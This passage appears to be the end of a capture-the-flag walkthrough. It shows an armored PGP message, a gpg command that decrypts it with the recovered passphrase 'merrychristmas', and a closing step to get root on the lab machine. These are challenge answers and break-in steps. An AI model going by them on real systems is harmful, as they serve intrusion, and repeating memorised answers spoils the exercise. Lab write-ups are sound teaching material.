https://openpgpjs.orgwcBMA/ZcqHmj13/kAQgAkS/2GvYLxglAIQpzFCydAPOj6QwdVV5BR17W5pscg/ajGlQbkE6wgmpoV7HuyABUjgrNYwZGN7ak2Pkb+/3LZgtpV/PJCAD030kYpCLSEEzPBiIGQ9VauHpATf8YZnwK1JwO/BQnpJUJV71YOon6PNV71T2zFr3HoAFbR/wPyF6Lpkwy56u3A2A6lbDb3sRl/SVIj6xtXn+fICeHjvYEm2IrE4Pxl+DjN5Nf4aqxEheWzmJwcyYqTsZLMtw+rnBlLYOaGRaa8nWmcUlMrLYD218RzyL8zZw0AEo6aOToteDPchiIMqjuExsqjG71CO1ohIIlnlK602+x7/8b7nQpedLA7wF8tR9g8Tpy+ToQOozGKBy/auqOHO66vA1EKJkYSZzMXxnp45XA38+ul0/OwtBNuNHreOIH090dHXx69IsyrYXt9dAbFhvbWr6eP/MIgh5I0RkYwGCtoPeQehKMPkCzyQl6Ren4iKS+F+L207kwqZ+jP8uEn3nauCmm64pcvy/RZJp7FUlT7Sc0hmZRIRQJ2U9vK2V63Yre0hfAj0f8F50cRR+v+BMLFNJVQ6Ck3Nov8fG5otsEteRjkc58itOGQ38EsnH3sJ3WuDw8ifeR/+K72r39WiBEiE2WHVey5nOF6WEnUOz0j0CKoFzQgri9YyK6CZ3519x3amBTgITmKPfgRsMy2OWU/7tYNdLxO3vh2Eht7tqqpzJwW0CkniTLcfrzP++0cHgAKF2tkTQtLO6QOdpzIH5aIebmi/MVUAw3a9J+qeVvjdtvb2fKCSgEYY4ny992ov5nTKSH9Hi1ny2vrBhsnO9/aqEQ+2tE60QFsa2dbAAn7QKk8VE2B05jBGSLa0H7xQxshwSQYnHaJCE6TQtOIti4o2sKEAFQnf7RDgpWeugbn/vphihSA984=P38i-----END PGP MESSAGE-----Need to decrypt the message and the previous password maybe is the password to decrypt it.gpg --decrypt -a --pinentry-mode=loopback --passphrase=\"merrychristmas\" pgp.asc--pinentry-mode=loopback =&gt; Redirect Pinentry queries to the caller. Note that in contrast to Pinentry the user is not prompted again if he enters a bad password.Command to decrypt the PGP message with the passphrase that we get from the hash.Get into the root.References:https://stackoverflow.com/questions/55780390/how-to-pass-encrypted-message-and-passphrase-when-using-os-system-to-call-gpg" } ]
